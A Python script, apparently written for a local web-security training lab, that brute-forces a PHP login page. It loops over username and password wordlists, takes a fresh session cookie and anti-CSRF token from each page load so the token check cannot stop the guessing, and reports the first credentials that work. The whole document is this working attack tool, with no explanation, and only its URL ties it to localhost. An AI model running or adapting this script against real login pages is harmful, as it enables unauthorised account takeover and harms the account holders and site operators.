#!/usr/bin/python3

import requests
from bs4 import BeautifulSoup
#BautifulSOup to read HTML ? 

URL = "http://localhost/login.php"

PASSWORD_WORDLIST = "./password_wordlist.txt"
USERNAME_WORDLIST = "./username_wordlist.txt"

def check_credentials(username, password):    
    # -- first request to get CSRF code and cookie value
    r1 = requests.get(URL)
    
    cookie = r1.headers["Set-Cookie"].split("PHPSESSID=")[1].split(";")[0]    
    soup = BeautifulSoup(r1.text, 'html.parser')
    csrf_token = soup.find("input", {"name": "user_token"})["value"]
    
    # -- second request to check creds    
    data = f"username={username}&password={password}&Login=Login&user_token={csrf_token}"
    
    custom_headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "Cookie": f"security=impossible; PHPSESSID={cookie}",
    }

    r2 = requests.post(URL, headers=custom_headers, data=data, allow_redirects=False)

    # -- third request to follow redirect
    r3 = requests.get(URL, headers=custom_headers)
    
    if "Login failed" in r3.text:
        return False
    else:
        return True
    
# --------------------------
# Execution starts here

if __name__ == "__main__":
    # -- read wordlists
    usernames = open(USERNAME_WORDLIST, "r").read().splitlines()
    passwords = open(PASSWORD_WORDLIST, "r").read().splitlines()

    for user in usernames:
        for password in passwords:
            if check_credentials(user, password):
                print(f"Found credentials! ({user}:{password})")
                exit()
               
